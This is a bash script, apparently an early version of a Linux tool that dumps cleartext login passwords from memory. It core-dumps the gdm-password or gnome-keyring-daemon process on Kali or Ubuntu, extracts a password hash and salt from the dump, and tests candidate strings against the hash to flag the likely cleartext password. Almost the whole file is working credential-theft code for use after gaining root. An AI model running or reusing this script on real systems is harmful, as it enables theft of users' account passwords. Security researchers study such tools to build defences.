#! /bin/bash

# Author: Hunter Gregal
# Github: /huntergregal
# Contribution from pugilist - PID extraction method 
# Dumps cleartext credentials from memory

#root check
if [[ $EUID -ne 0 ]]; then
	echo "Root required - You are dumping memory..."
	echo "Even mimikatz requires administrator"
	exit 1
fi

#If Kali
if [[ `uname -a | awk '{print tolower($0)}'` == *"kali"* ]]; then
	#get gdm-session-worker [pam/gdm-password] process
	PID="$(ps -eo pid,command | sed -rn '/gdm-password\]/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
	gcore -o /tmp/dump $PID >& /dev/null
	HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
	SALT="$(echo $HASH | cut -d'$' -f 3)"
	DUMP="$(strings "/tmp/dump.${PID}" | egrep '^gkr_system_authtok$' -B 5 -A 5)"
fi

#If Ubuntu
if [[ `uname -a | awk '{print tolower($0)}'` == *"ubuntu"* ]]; then
	#get /usr/bin/gnome-keyring-daemon process
	PID="$(ps -eo pid,command | sed -rn '/gnome\-keyring\-daemon/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
	gcore -o /tmp/dump $PID >& /dev/null
	HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
	SALT="$(echo $HASH | cut -d'$' -f 3)"
	DUMP=$(strings "/tmp/dump.${PID}" | egrep '^.+libgck\-1\.so\.0$' -B 10 -A 10)
fi

#Results to STDOUT - CSV style 
echo "Password located somewhere below:"
echo "Word,PasswordPotential"

if [[ $HASH ]]; then
	echo "$HASH,HASH"
fi

#Determine password potential for each word
while read -r line; do
	if [[ $line =~ ^_pammodutil.+[0-9]$ ]]; then
		echo "$line,LOW"
	elif [[ $line =~ ^LOGNAME= ]]; then
		echo "$line,LOW"
	elif [[ $line =~ ^UTF\-8 ]]; then
		echo "$line,LOW"
	elif [[ $line =~ ^splayManager[0-9]$ ]]; then
		echo "$line,LOW"
	elif [[ $line =~ ^gkr_system_authtok$ ]]; then
		echo "$line,LOW"
	elif [[ $line =~ [0-9]{1,4}:[0-9]{1,4}: ]]; then
		echo "$line,LOW"
	elif [[ `mkpasswd -m "sha-512" -S $SALT -s <<< $line` == $HASH ]]; then
		echo "$line,HIGH"
	else
		echo "$line,MEDIUM"
	fi
done <<< "$DUMP"
